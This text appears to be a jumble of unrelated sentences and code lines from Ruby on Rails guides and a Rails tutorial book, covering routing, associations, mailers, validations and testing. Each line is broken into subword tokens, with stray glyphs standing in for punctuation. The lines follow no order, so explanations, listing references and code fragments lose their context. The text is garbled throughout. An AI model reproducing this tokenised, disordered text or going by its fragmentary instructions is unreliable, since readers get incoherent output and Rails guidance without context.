▁` beginning _ of _ year ` ▁is ▁alias ed ▁to ▁` at _ beginning _ of _ year `, ▁and ▁` end _ of _ year ` ▁is ▁alias ed ▁to ▁` at _ end _ of _ year ` .
▁| ▁NULL ▁| ▁NULL ▁| ▁NULL ▁| ▁1 ▁| ▁Using ▁where ▁|
▁#### ▁javascript _ path
▁They ▁can ▁also ▁be ▁removed ▁from ▁the ▁ stack ▁completely :
▁The ▁\ k ode { where } ▁method ▁is ▁a ▁flexible ▁and ▁powerful ▁way ▁to ▁create ▁database ▁queries .
▁S ince ▁its ▁ de but ▁in ▁200 4 , ▁Ruby ▁on ▁Rails ▁has ▁ rap id ly ▁become ▁one ▁of ▁the ▁most ▁powerful ▁and ▁popular ▁framework s ▁for ▁build ing ▁dynamic ▁web ▁applications .
▁# ▁No ▁first _ name ▁instance ▁reader ▁is ▁generated .
▁@ articles ▁= ▁current _ user ▖ visible _ articles ▖ where ( name : ▁params [: name ])
▁I ▁find ▁this ▁approach ▁to ▁be ▁more ▁flexible ▁than ▁Cucumber ▁step ▁definition s , ▁particular ly ▁when ▁the ▁match ers ▁or ▁should ▁helpers ▁natural ly ▁take ▁an ▁argument , ▁such ▁as ▁\ k ode { valid \_ signin ( user )} .
▁Rails ▁allows ╼ you ▁to ▁use ▁the ▁` dependent ` ▁option ▁of ▁an ▁association ▁to ▁achieve ▁this ▖
▁By ▁replacing ▁the ▁question ▁mark s ▁in ▁Listing ~\ ref { code : string _ shuffle } ▁with ▁the ▁appropriate ▁methods , ▁combine ▁\ k ode { split }, ▁\ k ode { shuffle }, ▁and ▁\ k ode { join } ▁to ▁write ▁a ▁function ▁that ▁ shuffle s ▁the ▁letter s ▁in ▁a ▁given ▁string .
▁You ▁m ight ▁note ▁that ▁there ' s ▁one ▁column ▁in ▁Figure ~\ ref { fig : sqlite _ database _ browser } ▁not ▁account ed ▁for ▁in ▁the ▁migration : ▁the ▁\ k ode { id } ▁column .
▁We ' ve ▁come ▁now ▁to ▁the ▁end ▁of ▁the ▁high - level ▁ overview ▁of ▁a ▁Rails ▁application .
▁You ▁can ▁also ▁supply ▁HTML ▁attributes ▁as ▁an ▁ additional ▁option ▁hash ▖
▁Now ▁that ▁we ▁have ▁a ▁working ▁( t hough ▁not ▁yet ▁complete ) ▁user ▁profile ▁page , ▁we ' re ▁ready ▁to ▁make ▁a ▁signup ▁form ▁for ▁our ▁site .
▁#### # ▁`: auto save `
▁In ╼ this ▁situation , ▁the ▁only ▁parameters ▁that ▁matter ▁are ▁the ▁one s ▁from ▁the ▁form .
▁ V ia : ▁1▖ 1 ▁ ve g ur
▁( Because ▁\ k ode { ' 1 ' } ▁is ▁the ▁default ▁value ▁of ▁\ k ode { remember \_ me }, ▁we ▁could ▁omit ▁the ▁corresponding ▁option ▁in ▁the ▁first ▁case ▁above , ▁but ▁I ' ve ▁included ▁it ▁to ▁make ▁the ▁parallel ▁structure ▁more ▁apparent ▖)
▁* ▁How ▁to ▁generate ▁and ▁edit ▁an ▁Action ▁Mailer ▁class ▁and ▁mailer ▁view .
▁In ▁old er - style ▁HTML , ▁\ k ode { div } ▁tags ▁are ▁used ▁for ▁ nearly ▁all ▁site ▁ div is ion s , ▁but ▁HTML 5 ▁add s ▁the ▁\ k ode { header }, ▁\ k ode { nav }, ▁and ▁\ k ode { section } ▁elements ▁for ▁ div is ion s ▁common ▁to ▁many ▁applications .
▁If ▁you ▁use ▁the ▁` readonly ` ▁method , ▁then ▁the ▁ associated ▁objects ▁will ▁be ▁read - only ▁when ▁retrieved ▁via ▁the ▁association .
▁Here ▁`` welcome '' ▁is ▁the ▁controller ▁name ▁and ▁`` index '' ▁is ▁the ▁action ▁within ▁that ▁controller .
▁Defin ing ▁the ▁root ▁route ▁in ▁this ▁way ▁has ▁a ▁second ▁important ▁effect , ▁which ▁is ▁to ▁create ▁named ▁routes ▁that ▁allow ▁us ▁to ▁refer ▁to ▁routes ▁by ▁a ▁name ▁rather ▁than ▁by ▁the ▁raw ▁URL ▖ ▁In ▁this ▁case , ▁these ▁routes ▁are ▁\ k ode { root \_ path } ▁and ▁\ k ode { root \_ url }, ▁with ▁the ▁only ▁difference ▁being ▁that ▁the ▁latter ▁includes ▁the ▁full ▁URL :
▁The ▁\ k ode { Micropost } ▁class , ▁highlight ing ▁inheritance .
▁The ▁reason ▁is ▁that ▁we ▁are ▁quite ▁far ▁from ▁writing ▁a ▁working ▁web ▁interface ▁for ▁following ▁users , ▁but ▁it ' s ▁hard ▁to ▁proceed ▁without ▁some ▁sort ▁of ▁\ emph { client } ▁for ▁the ▁code ▁we ' re ▁developing .
▁</ html >
▁A ▁ factory ▁to ▁simul ate ▁User ▁model ▁objects .
▁If ▁non - dup li c ate ▁information ▁is ▁provided ▁you ▁will ▁get ▁all ▁unique ▁values , ▁environment ▁variable ▁ still ▁take s ▁precedence ▁in ▁cases ▁of ▁any ▁conflicts .
▁#### ▁S end ing ▁E mail ▁To ▁M ultiple ▁Re ci p i ent s
▁It ' s ▁thus ▁important ▁to ▁test ▁for ▁case - in s en s it i v ity , ▁which ▁we ▁do ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } .
▁# ▁=> ▁[
▁It ' s ▁the ▁ o p in ion ▁of ▁the ▁Rails ▁team ╼ that ▁model - level ▁validations ▁are ▁the ▁most ▁appropriate ▁in ▁most ▁c irc um st ance s .
▁ modeling - users
▁E ve ry ▁Rails ▁application ▁comes ▁with ▁a ▁standard ▁set ▁of ▁middleware ▁which ▁it ▁uses ▁in ▁this ▁order ▁in ▁the ▁development ▁environment :
▁The ▁flash - less ▁profile ▁page ▁after ▁a ▁browser ▁ reload .
▁( If ▁you ▁don ' t ▁current ly ▁have ▁a ▁user ▁in ▁your ▁database , ▁you ▁should ▁visit ▁Section ~\ ref { sec : creating _ and _ authenticating _ a _ user } ▁now ▁and ▁complete ▁it ▁before ▁proceeding ▖)
▁ EXPLAIN ▁for : ▁ SELECT ▁` articles ` .
▁A ▁profile ▁with ▁an ▁ unfollow ▁button ▁and ▁ increment ed ▁followers ▁count .
▁has _ many ▁: orders ,
▁* ▁If ▁the ▁argument ▁respond s ▁to ▁` to _ ary ` ▁the ▁method ▁is ▁invoke d ▖
▁In ▁this ▁chapter , ▁we ' ll ▁develop ▁a ▁simple ▁ demo n str ation ▁application ▁to ▁show ▁off ▁some ▁of ▁the ▁power ▁of ▁Rails .
▁And , ▁believe ▁it ▁or ▁not , ▁in ▁this ▁chapter ▁we ' ll ▁even ▁put ▁our ▁first ▁app ▁on ▁the ▁ wide r ▁web ▁by ▁\ emph { deploying } ▁it ▁to ▁production ▁( Section ~\ ref { sec : deploying }) .
▁This ▁is ▁set ▁to ▁false ▁in ╼ ▁` config / environments / production ▖ rb ` ▁which ▁is ▁generated ▁by ▁Rails ▖
▁Change ▁ still ▁seem s ▁reason able ▁to ▁you ?
▁This ▁time ▁we ' ll ▁create ▁a ▁` Comment ` ▁model ▁to ▁hold ╼ ref er ence ▁of ▁article ▁comments ▖
▁The ▁Users ▁controller ▁in ▁schematic ▁form .
▁Here ▁the ▁option ▁\ k ode { dependent : ▁: destroy } ▁in
▁$ ▁git ▁ clone ▁git :// github ▖ com / rails / rails ▖ git
▁The ▁generated ▁code ▁also ▁includes ▁an ▁instance ▁variable ▁(\ k ode {@ greeting }), ▁which ▁is ▁available ▁in ▁the ▁mailer ▁views ▁in ▁much ▁the ▁same ▁way ▁that ▁instance ▁variables ▁in ▁controllers ▁are ▁available ▁in ▁ordinar y ▁views .
▁The ▁rest ▁of ▁the ▁tutorial ▁focus es ▁on ▁developing ▁a ▁single ▁large ▁\ emph { sample ▁application } ▁( called ▁\ k ode { sample \_ app }), ▁writing ▁all ▁the ▁code ▁from ▁scratch .
▁as ▁show n ▁in ▁Listing ~\ ref { code : authorize _ before _ filter } .
▁But ▁since ▁constant s ▁and ▁module s ▁are ▁in de ed ▁kind ▁of ▁ de co up le d , ▁module ▁objects ▁can ▁become ▁un reachable :
▁( We ' ll ▁discuss ▁this ▁subject ▁in ▁more ▁ de p th ▁in ▁Section ~\ ref { sec : remember _ me } ▖)
▁| --------------- | - - --- -------- |
▁page ▁= ▁P age ▖ find _ by ( address : ▁email ▖ to ▖ first )
▁ Caching ▁will ▁only ▁happen ▁if ▁` ActionController :: Base ▖ perform _ caching ` ▁is ▁set ▁to ▁true ▁( which ▁is ▁the ▁case ▁by ▁default ▁for ▁the ▁Rails ▁production ▁environment , ▁but ▁not ▁for ▁the ▁development ▁environment ) .
▁user ▖ reset _ password !
▁in ╼\ end { code }╼╼ ▁\ subsection { Sessions ▁controller } ▁% ▁( fold )╼ ▁\ label { sec : sessions _ controller }╼╼
▁and ▁ authenticate ▁the ▁user ▁with ▁code ▁like
▁### ▁N a m ing ▁Route s
▁In ▁the ▁above ▁case ▁there ▁are ▁ still ▁two ▁reading s ▖
▁Next , ▁we ▁need ▁a ▁test ▁to ▁capture ▁the ▁ sequence ▁show n ▁in ▁Figure ~\ ref { fig : failed _ login _ flash } ▁and ▁Figure ~\ ref { fig : flash _ persistence } .
▁Running ▁the ▁toy ▁app ▁in ▁production .
▁$ ▁ cat ▁config / database ▖ yml
▁As ▁with ▁RSpec , ▁ Factory ▁Girl ▁defines ▁a ▁domain - specific ▁language ▁in ▁Ruby , ▁in ▁this ▁case ▁special ize d ▁for ▁defin ing ▁Active ▁Record ▁objects .
▁The ▁` author ` ▁association ▁will ▁be ▁hard - code d ▁to ▁the ╼` User ` ▁class ▁for ▁the ▁time ▁being .
▁#### ▁S e ar ch ▁Path s
▁* ▁How ▁to ▁use ▁the ▁methods ▁added ▁to ▁your ▁models ▁by ▁creating ▁associations .
▁If ▁you ▁want ▁your ▁form ▁ builder ▁class ▁to ▁be ▁loaded ▁after ▁initialization ▁( so ▁it ' s ▁ reload ed ▁on ▁each ▁request ▁in ▁development ), ▁you ▁can ▁pass ▁it ▁as ▁a ▁` String `
▁=============
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / keys ▖ rb ` .
▁<%= ▁f ▖ label ▁: name ▁%>< br >
▁* ▁P ref er ▁` & & ` / ` | | ` ▁over ▁` and ` / ` or ` .
▁* ▁In ▁Rails ▁4▖0 , ▁` S C R IP T _ N A M E ` ▁is ▁properly ▁nested ▁when ▁engines ▁are ▁m o un ted ▁on ▁an ▁app ▁that ' s ▁served ▁from ▁a ▁URL ▁prefix ▖
▁It ▁is ▁OK ▁that ▁the ▁helper ▁module ▁does ▁not ▁exist , ▁so ▁if ▁an ▁exception ▁for ▁that ▁constant ▁name ▁is ▁raised ▁it ▁should ▁be ▁ silence d ▖
▁in ▁Listing ~\ ref { code : home _ page _ signup _ link } .
▁resources ▁: ads , ▁as : ▁' period ical _ ads '
▁| ▁GET ▁| ▁ / photos ▁| ▁photos # index ▁| ▁images _ path ▁|
▁* ▁`: inverse _ of `
▁Now ▁that ▁the ▁basic ▁User ▁model ▁is ▁complete , ▁we ' ll ▁create ▁a ▁user ▁in ▁the ▁database ▁as ▁prepar ation ▁for ▁making ▁a ▁page ▁to ▁show ▁the ▁user ' s ▁information ▁in ▁Section ~\ ref { sec : showing _ users } .
▁** ▁`: table _ name _ with _ underscore ` ▁would ▁make ▁the ▁primary ▁key ▁for ▁the ▁ Customer ▁class ▁` customer _ id `
▁Listing ~\ ref { code : home _ view _ erb _ title } ▁is ▁our ▁first ▁example ▁of ▁ embedded ▁Ruby , ▁also ▁called ▁\ emph { ERb } .
▁in ▁Listing ~\ ref { code : log _ in _ function } .
▁When ever ▁some one ▁go es ▁to ▁the ▁root ▁path ▁where ▁the ▁engine ▁is ╼ m o un ted , ▁they ▁should ▁be ▁show n ▁a ▁list ▁of ▁articles ▖
▁To ▁include ▁` http :// example ▖ com / main ▖ js `:
▁ Array ▁assignment ▁in ▁Ruby ▁copie s ▁a ▁\ emph { ref er ence } ▁to ▁the ▁array , ▁not ▁the ▁full ▁array ▁itself , ▁which ▁means ▁that ▁changes ▁to ▁the ▁original ▁array ▁also ▁a ffect ▁the ▁copy .
▁If ▁a ▁helper ▁is ▁specific ▁to ▁a ▁particular ▁controller , ▁you ▁should ▁put ▁it ▁in ▁the ▁corresponding ▁helper ▁file ; ▁for ▁example , ▁helpers ▁for ▁the ▁StaticPages ▁controller ▁generally ▁go ▁in ▁\ k ode { app / helpers / static \_ pages \_ helper ▖ rb } .
▁D ir ec t ▁ ex pe ri ment ation ▁with ▁SQLite ▁on ▁my ▁system ▁and ▁PostgreSQL ▁on ▁Heroku ▁show ▁that ▁this ▁step ▁is , ▁in ▁fact , ▁necessary .
▁We ' ll ▁build ▁on ▁the ▁test ▁from ▁Listing ~\ ref { code : flash _ persistence _ test } ▁and ▁write ▁a ▁series ▁of ▁steps ▁to ▁verify ▁the ▁following ▁ sequence ▁of ▁actions :
▁render ▁' new '
▁That ▁should ▁be ▁re raise d ▖
▁M any ▁computer ▁program s ▁involve ▁ increment ing ▁a ▁variable , ▁as ▁in
▁ Adding ▁an ▁image ▁to ▁the ▁Micropost ▁model .
▁Because ▁we ' ll ▁want ▁to ▁use ▁the ▁same ▁login ▁technique ▁in ▁a ▁couple ▁of ▁different ▁place s , ▁we ' ll ▁define ▁a ▁method ▁called ▁\ k ode { log \_ in } ▁in ▁the ▁Sessions ▁helper , ▁as ▁show n ▁in ▁Listing ~\ ref { code : log _ in _ function } .
▁git ▁: in it
▁* ▁What ▁make s ▁an ▁engine .
▁Using ▁\ k ode { self } ▁ensure s ▁that ▁assignment ▁set s ▁the ▁user ' s ▁\ k ode { remember \_ token }, ▁and ▁as ▁a ▁result ▁it ▁will ▁be ▁written ▁to ▁the ▁database ▁along ▁with ▁the ▁other ▁attributes ▁when ▁the ▁user ▁is ▁saved .
▁raise ▁e ▁unless ▁e ▖ missing _ name ?
▁With ▁the ▁\ k ode {@ user } ▁instance ▁variable ▁as ▁defined ▁in ▁Listing ~\ ref { code : mail _ account _ activation }, ▁we ▁can ▁create ▁the ▁necessary ▁links ▁using ▁the ▁named ▁edit ▁route ▁and ▁ embedded ▁Ruby , ▁as ▁show n ▁in ▁Listing ~\ ref { code : account _ activation _ view _ text } ▁and ▁Listing ~\ ref { code : account _ activation _ view _ html } .
▁Whi le ▁the ▁array ▁construct or ▁\ k ode { Array ▖ new } ▁take s ▁an ▁initial ▁value ▁for ▁the ▁array , ▁\ k ode { Hash ▖ new } ▁take s ▁a ▁\ emph { default } ▁value ▁for ▁the ▁hash , ▁which ▁is ▁the ▁value ▁of ▁the ▁hash ▁for ▁a ▁non ex ist ent ▁key :
▁( Note ▁that ▁this ▁is ▁a ▁technical ▁ term ; ▁in ▁particular , ▁it ' s ▁\ emph { not } ▁a ▁ mis s pe ll ing ▁of ▁`` me m or i z ation '' ▖)
▁#### ▁Time st amp s
▁### ▁ vendor / plugin s
▁It ▁is ▁also ╼ possibl e ▁to ▁control ▁when ▁to ▁run ▁these ▁custom ▁validations ▁by ▁giv ing ▁an ▁`: on `╼ option ▁to ▁the ▁` validate ` ▁method , ▁with ▁either : ▁`: create ` ▁or ▁`: update ` .
▁database : ▁blog _ development
▁The ▁default ▁user ▁fixtures ▖
▁This ▁generates ▁the ▁same ▁routes ▁as ▁the ▁previous ▁example :
▁We ' ll ▁start ▁by ▁giv ing ▁users ▁the ▁ability ▁to ▁update ▁their ▁profile s , ▁which ▁will ▁also ▁provide ▁a ▁natural ▁opportunit y ▁to ▁enforce ▁an ▁ authorization ▁model ▁( ma de ▁possible ▁by ▁the ▁authentication ▁code ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out }) .
▁in ▁Listing ~\ ref { code : raw _ home _ view } ▁and
▁In ▁particular , ▁let ' s ▁write ▁a ▁test ▁to ▁verify ▁that ▁the ▁first ▁micropost ▁in ▁the ▁database ▁is ▁the ▁same ▁as ▁a ▁fixture ▁micropost ▁we ' ll ▁call ▁\ k ode { most \_ recent }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ order _ test } .
▁The ▁model ▁tests ▁should ▁now ▁be ▁\ passing :
▁This ▁simply ▁involve s ▁ filling ▁in ▁the ▁second ▁arguments ▁of ▁the ▁\ k ode { link \_ to } ▁function s ▁with ▁the ▁proper ▁named ▁routes .
▁ Foo ter ▁partial ▁with ▁links .
▁ Write ▁tests ▁before ▁refactoring ▁code , ▁focus ing ▁on ▁testing ▁error - prone ▁code ▁that ' s ▁es pecially ▁likely ▁to ▁break .
▁To ▁make ▁the ▁view ▁for ▁new ▁password ▁resets , ▁we ' ll ▁work ▁in ▁analogy ▁with ▁the ▁previous ▁form ▁for ▁making ▁a ▁new ▁non - - Active ▁Record ▁resource , ▁name ly , ▁the ▁login ▁form ▁( Listing ~\ ref { code : login _ form }) ▁for ▁creating ▁a ▁new ▁session , ▁show n ▁again ▁in ▁Listing ~\ ref { code : login _ form _ redux } ▁for ▁reference .
▁M any ▁Rails ▁programmer s ▁find ▁Cucumber ▁es pecially ▁convenient ▁when ▁doing ▁client ▁work ; ▁since ▁they ▁can ▁be ▁read ▁even ▁by ▁non - technical ▁users , ▁Cucumber ▁tests ▁can ▁be ▁ shared ▁with ▁( and ▁can ▁some times ▁even ▁be ▁written ▁by ) ▁the ▁client .
▁@ user ▁= ▁user
▁One ▁of ▁the ▁most ▁powerful ▁features ▁of ▁Rails ▁is ▁the ▁ability ▁to ▁form ▁\ emph { associations } ▁between ▁different ▁data ▁models .
▁The ▁raw ▁ home ▁view ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home }) .
▁ s ▁= ▁ sanitize ( user _ input , ▁tags : ▁tags , ▁attributes : ▁% w ( href ▁title ) )
▁The ▁ description ▁start s ▁in ▁upper ▁case ▁and ▁end s ▁with ▁a ▁full ▁stop - it ' s ▁standard ▁English .
▁* ▁` add _ view _ paths ` ▁Add s ▁the ▁directory ▁` app / views ` ▁from ▁the ▁application , ▁ railties ▁and ▁engines ▁to ▁the ▁look up ▁path ▁for ▁view ▁files ▁for ▁the ▁application .
▁< a ▁ href ="# " ▁data - background - color ="# 0 000 99 " ▁data - text - color ="# FFFFFF "> P aint ▁it ▁b l ue </ a >
▁@ article ▁= ▁Article ▖ find ( params [: id ])
▁The ▁name ▁of ▁this ▁method ▁could ▁change , ▁or ▁the ▁return ▁value , ▁or ▁this ▁entire ▁class ▁may ▁disappear ; ▁there ' s ▁no ▁guarantee ▁and ▁so ▁you ▁should n ' t ▁depend ▁on ▁this ▁API ▁in ▁your ▁plugin s ▁or ▁applications ▖
▁# ▁=> ▁< select ▁id =" people " ▁name =" people " >< option > David </ option ></ select >
▁WARNING : ▁If ▁you ▁are ▁upgrading ▁from ▁Rails ▁3 , ▁please ▁take ▁into ▁account ▁that ▁assets ╼ un d er ▁` lib / assets ` ▁or ▁` vendor / assets ` ▁are ▁available ▁for ▁inclusion ▁via ▁the ╼ application ▁manifest s ▁but ▁no ▁longer ▁part ▁of ▁the ▁ precompile ▁array ▖
▁In ▁addition , ▁on ▁error ▁pages ▁Rails ▁automatically ▁wrap s ▁the ▁fields ▁with ▁errors ▁in ▁\ k ode { div } s ▁with ▁the ▁CSS ▁class ▁\ k ode { field \_ with \_ errors } .
▁The ▁`: batch _ size ` ▁option ▁allows ▁you ▁to ▁specify ▁the ▁number ▁of ▁records ▁to ▁be ▁retrieved ▁in ▁each ▁ batch , ▁before ▁being ▁passed ▁individual ly ▁to ▁the ▁block ▖
▁Active ▁Record ▁uses ▁naming ▁convention s ▁for ▁the ▁columns ▁in ▁database ▁table s ,╼ de pending ▁on ▁the ▁purpose ▁of ▁these ▁columns .
▁Now , ▁when ▁we ▁visit ▁ / users /1 , ▁the ▁Rails ▁server ▁shows ▁a ▁\ k ode { by ebug } ▁pro mp t :
▁belongs _ to ▁: customer , ▁ touch : ▁true
▁S a fe E rb ▁re m in d s ▁you ▁to ▁escape ▁strings ▁from ▁external ▁source s .
▁< li >`: file `: ▁save ▁email s ▁to ▁files ; ▁can ▁be ▁configured ▁by ▁using ▁` config ▖ action _ mailer ▖ file _ settings ` ▖ </ li >
▁NOTE ▖ ▁D ue ▁to ▁the ▁ ch mod ▁operation ▁` atomic _ write ` ▁perform s , ▁if ▁the ▁ target ▁file ▁has ▁an ▁A C L ▁set ▁on ▁it ▁this ▁A C L ▁will ▁be ▁re calculate d / modified .
▁Blorgh :: Engine ▖ routes ▖ d raw ▁do
▁NOTE : ▁ Routing ▁both ▁` GET ` ▁and ▁` POST ` ▁requests ▁to ▁a ▁single ▁action ▁has ▁security ▁implications ▖
▁You ▁can ▁do ▁so ▁by ▁running :
▁The ▁same ▁format ▁can ▁be ▁used ▁to ▁set ▁c a rb on ▁copy ▁( C c : ) ▁and ▁b li nd ▁c a rb on ▁copy ╼ ( B cc : ) ▁re ci p i ent s , ▁by ▁using ▁the ▁`: cc ` ▁and ▁`: b cc ` ▁keys ▁respectively .
▁Instead , ▁hash ▁indices , ▁or ▁\ emph { keys }, ▁can ▁be ▁ al most ▁any ▁object .
▁Fin ally , ▁many , ▁many ▁readers --- f ar ▁too ▁many ▁to ▁list --- have ▁contribute d ▁a ▁h ug e ▁number ▁of ▁bug ▁report s ▁and ▁suggest ion s ▁during ▁the ▁writing ▁of ▁this ▁book , ▁and ▁I ▁gra te full y ▁a c knowledg e ▁their ▁help ▁in ▁making ▁it ▁as ▁good ▁as ▁it ▁can ~ be .
▁#### ▁time _ zone _ select
▁In ▁other ▁words , ▁the ▁do t ▁\ k ode { ▖ } ▁in ▁\ k ode { ▖ center } ▁indicates ▁that ▁the ▁rule ▁style s ▁a ▁class .
▁A ▁custom ▁prefix ▁may ▁also ▁be ▁configured :
▁When ▁we ▁write
▁In ▁the ▁process , ▁we ' ll ▁see ▁a ▁first ▁example ▁of ▁the ▁branch , ▁edit , ▁commit , ▁merge ▁work flow ▁that ▁I ▁recommend ▁using ▁with ▁Git
▁However , ▁any ▁model ▁method ▁override s ▁will ╼ not ▁be ▁available ▖
▁The ▁result ▁appears ▁in ▁Figure ~\ ref { fig : password _ reset _ form } .
▁When ▁ submitting ▁the ▁signup ▁form ▁ developed ▁in ▁this ▁chapter , ▁the ▁name , ▁email ▁address , ▁and ▁password ▁get ▁sent ▁over ▁the ▁ net work , ▁and ▁hence ▁are ▁vulnerable ▁to ▁inter ce p t .
▁Here ▁is ▁the ▁ sequence ▁I ▁recommend :
▁X - Runtime : ▁0▖0 14 2 9 7
▁Call ing ▁` to _ s ` ▁on ▁a ▁ safe ▁string ▁returns ▁a ▁ safe ▁string , ▁but ▁co er c ion ▁with ▁` to _ str ` ▁returns ▁an ▁un safe ▁string .
▁By ▁running ▁the ▁test ▁suite , ▁verify ▁that ▁the ▁\ k ode { before \_ save } ▁callback ▁can ▁be ▁written ▁using ▁the ▁`` bang '' ▁method ▁\ k ode { email ▖ downcase !} \ ▁to ▁modify ▁the ▁\ k ode { email } ▁attribute ▁directly , ▁as ▁show n ▁in ▁Listing ~\ ref { code : downcase _ bang } .
▁To ▁apply ▁it , ▁we ▁just ▁ migrate ▁the ▁database :
▁This ▁will ▁enable ▁Rails ▁to ▁recognize ▁paths ▁such ▁as ▁` / comments / new / preview ` ▁with ▁GET , ▁and ▁route ▁to ▁the ▁` preview ` ▁action ▁of ▁` Comments Controller ` ▖
▁In ▁particular , ▁it ▁doesn ' t ▁enforce ▁any ▁constraints ▁on ▁the ▁upload ed ▁file , ▁which ▁can ▁cause ▁problem s ▁if ▁users ▁try ▁to ▁upload ▁large ▁files ▁of ▁invalid ▁file ▁types .
▁Create ▁a ▁new ▁file ▁at ▁` app / views / blorgh / comments / _ comment ▖ html ▖ erb ` ▁and ▁put ▁this ╼ line ▁inside ▁it :
▁In ▁the ▁next ▁chapter , ▁we ' ll ▁build ▁on ▁the ▁foundation ▁from ▁Chapter ~\ ref { cha : beginning } ▁to ▁make ▁a ▁database - back ed ▁\ emph { toy ▁app }, ▁which ▁will ▁give ▁us ▁our ▁first ▁real ▁taste ▁of ▁what ▁Rails ▁can ▁do .
▁Instead , ▁we ' ll ▁simul ate ▁the ▁same ▁series ▁of ▁steps ▁using ▁an ▁\ emph { integration ▁test }, ▁which ▁allows ▁us ▁to ▁write ▁an ▁end - to - end ▁test ▁of ▁our ▁application ' s ▁behavior .
▁There ' s ▁also ▁a ▁related ▁idiom ▁that ▁uses ▁the ▁ s plat ▁operator :
▁Running ▁ EXPLAIN
▁This ╼ will ▁be ▁the ▁template ▁used ▁for ▁the ▁email , ▁ formatted ▁in ▁HTML :
▁You ' re ▁getting ▁this ▁error ▁now ▁because ▁Rails ▁expect s ▁plain ▁actions ▁like ▁this ▁one ╼ to ▁have ▁views ▁ associated ▁with ▁them ▁to ▁display ▁their ▁information ▖
▁12345678▖ 05 ▖ to _ s (: delimited , ▁ separator : ▁" ▁" ) ▁# ▁=> ▁12,345,678 ▁ 05
▁You ▁can ▁in validate ▁the ▁cache ▁by ▁alter ing ▁this ▁fingerprint ,╼ which ▁happens ▁automatically ▁when ever ▁you ▁change ▁the ▁file ▁contents .
▁Here ▁we ▁tell ▁ Factory ▁Girl ▁about ▁the ▁micropost ' s ▁ associated ▁user ▁just ▁by ▁including ▁a ▁user ▁in ▁the ▁definition ▁of ▁the ▁ factory :
▁ Previous ly , ▁calling ▁a ▁mailer ▁method ▁on ▁a ▁mailer ▁class ▁will ▁result ▁in ▁the ╼ c or respond ing ▁instance ▁method ▁being ▁executed ▁directly ▖
▁It ▁then ▁uses ▁\ k ode { cookies } ▁to ▁create ▁ permanent ▁cookies ▁for ▁the ▁user ▁id ▁and ▁remember ▁token ▁as ▁describe d ▁above .
▁For ▁example ▁` seconds _ since _ midnight ` ▁m ight ▁not ▁return ▁the ▁real ▁amount ▁in ▁such ▁a ▁day .
▁#< Client ▁id : ▁3 , ▁first _ name : ▁" Fi lo ">
▁``` erb
▁Fin ally , ▁since ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁uses ▁Rails ~ 4 , ▁the ▁ knowledg e ▁you ▁gain ▁here ▁represent s ▁the ▁state ▁of ▁the ▁ ar t ▁in ▁web ▁development .
▁Because ▁the ▁messages ▁are ▁generated ▁by ▁the ▁model ▁validations , ▁they ▁will ▁automatically ▁change ▁if ▁you ▁ever ▁change ▁your ▁mind ▁about , ▁say , ▁the ▁format ▁of ▁email ▁addresses , ▁or ▁the ▁ minimum ▁length ▁of ▁passwords .
▁even ▁though ▁the ▁under ly ing ▁model ▁is ▁called ▁Relationship .
▁For ▁one ▁thing , ▁if ▁the ▁review ▁title ▁is ▁" F la na g an ▁& ▁M at z ▁rules !" ▁the ▁output ▁won ' t ▁be ▁well - form ed ▁because ▁an ▁ amp ers and ▁has ▁to ▁be ▁escape d ▁as ▁" & amp ; amp ; "▖
▁The ▁index ▁by ▁itself ▁doesn ' t ▁enforce ▁uniqueness , ▁but ▁the ▁option ▁\ k ode { uniq ue : ▁true } ▁does .
▁To ▁help ▁understand ▁where ▁this ▁comes ▁from , ▁Table ~\ ref { table : valid _ email _ regex } ▁break s ▁it ▁into ▁bit e - size d ▁pieces
▁* ▁` stylesheets ` ▁turn s ▁on ▁the ▁ hook ▁for ▁stylesheets ▁in ▁generator s ▖
▁User ▁add ▁some ▁examples ▁to ▁( or ▁delete )
▁Fin ally , ▁even ▁if ▁you ▁d ec ide ▁not ▁to ▁use ▁the ▁cloud ▁IDE ▁excl us ive ly ▁in ▁real ▁ life ▁( and ▁I ▁certain ly ▁recommend ▁learning ▁other ▁tool s ▁as ▁well ), ▁it ▁provides ▁an ▁excellent ▁introduction ▁to ▁the ▁general ▁cap a b i li t ies ▁of ▁text ▁editor s ▁and ▁other ▁development ▁tool s .
▁The ▁\ k ode { generate } ▁ script ▁take s ▁an ▁optional ▁list ▁of ▁actions , ▁so ▁we ' ll ▁include ▁actions ▁for ▁the ▁Home ▁and ▁Help ▁pages ▁directly ▁on ▁the ▁command ▁line , ▁while ▁intention ally ▁leav ing ▁off ▁the ▁action ▁for ▁the ▁About ▁page ▁so ▁that ▁we ▁can ▁see ▁how ▁to ▁add ▁it ▁( Section ~\ ref { sec : getting _ started _ with _ testing }) .
▁create
▁< th > Title </ th >
▁@ article ▁= ▁Article ▖ new ( article _ params )
▁ W rap ▁this ▁block ▁around ▁ ex p en s ive ▁operations ▁or ▁possible ▁ bo tt le n ec k s ▁to ▁get ▁a ▁time ▁reading ▁for ▁the ▁operation .
▁The ▁value ▁for ▁this ▁option ▁must ▁be ▁a ▁ range .
▁A ▁controller ' s ▁purpose ▁is ▁to ▁receive ▁specific ▁requests ▁for ▁the ▁application ▖╼
▁One ▁an no y ance ▁ associated ▁with ▁using ▁the ▁\ k ode { rspec } ▁command ▁is ▁ having ▁to ▁switch ▁to ▁the ▁command ▁line ▁and ▁run ▁the ▁tests ▁by ▁hand .
▁The ▁SQL ▁equivalent ▁of ▁the ▁above ▁is :
▁To ▁get ▁the ▁delete ▁links ▁to ▁work , ▁we ▁need ▁to ▁add ▁a ▁\ k ode { destroy } ▁action ▁( Table ~\ ref { table : RESTful _ users }), ▁which ▁find s ▁the ▁corresponding ▁user ▁and ▁destroy s ▁it ▁with ▁the ▁Active ▁Record ▁\ k ode { destroy } ▁method , ▁finally ▁redirect ing ▁to ▁the ▁users ▁index , ▁as ▁seen ▁in ▁Listing ~\ ref { code : destroy _ action } .
▁Thu s , ▁to ▁be ▁as ▁secure ▁as ▁possible , ▁we ▁will ▁ er r ▁on ▁the ▁ side ▁of ▁caution ▁and ▁use ▁ private ▁repositories ▁by ▁default .
